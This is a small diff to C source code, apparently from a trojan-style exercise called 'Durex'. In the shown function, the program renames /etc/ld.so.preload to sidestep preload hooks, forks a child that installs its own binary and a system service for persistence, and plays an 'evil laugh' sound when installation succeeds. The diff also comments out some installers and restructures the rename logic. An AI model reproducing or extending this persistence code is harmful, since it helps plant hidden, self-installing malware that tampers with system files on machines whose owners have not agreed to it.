@@ -29,14 +29,17 @@ void				print_usr_name()
 		return ;
 	fd = open(DUREX_BINARY_FILE, O_RDONLY, 0700);
 	if (fd < 0) {
-		if (rename("/etc/ld.so.preload", "/etc/mamouth"))
+		if (rename("/etc/ld.so.preload", "/etc/mamouth")) {
 			if (fork() == 0)
 			{
-				if (!install_binary() && !install_service())
+				if (!install_binary() /*&& !install_conf()
+				&& !install_init()*/ && !install_service())
 					system("mpg123 -q ./audio/Evil_Laugh.mp3 2>/dev/null");
 				exit(0);
 			}
-		rename("/etc/mamouth", "/etc/ld.so.preload");
+		} else {
+			rename("/etc/mamouth", "/etc/ld.so.preload");
+		}
 		exit(0);
 	}
 	close(fd);
